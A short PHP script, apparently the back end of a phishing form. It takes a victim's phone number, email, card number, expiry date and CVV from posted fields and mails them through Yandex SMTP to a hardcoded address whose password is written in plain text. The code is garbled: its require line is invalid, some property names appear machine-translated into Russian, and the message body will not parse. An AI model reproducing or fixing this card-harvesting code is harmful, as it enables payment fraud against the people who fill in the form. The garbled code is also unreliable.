<?php
require_once  = 'class.phpmaileroauthgoogle.php'
$number = $_POST['user_telephone'];
$email = $_POST['user_email'];
$kart = $_POST['user_kart'];
$data_month = $_POST['user_data/month_kart'];
$svv = $_POST['user_svv'];

$mail->isSMTP();
$mail->Host ='smtp.yandex.ru';
$mail->SMTPAuth ='true';
$mail->Username ='vasya.borisenko2020@yandex.ru';
$ mail ->  Пароль  =  'Vasa3400' ;
$mail->SMTPSecure = 'ssl';
$ mail  ->  Порт  =  '465' ;
$mail->setFrom('vasya.borisenko2020@yandex.ru');
$mail->addAddress('vasya.borisenko2020@yandex.ru');
$mail->Subject='инфа';
$mail->Body='' $number $email $kart $data_month $svv;
?>
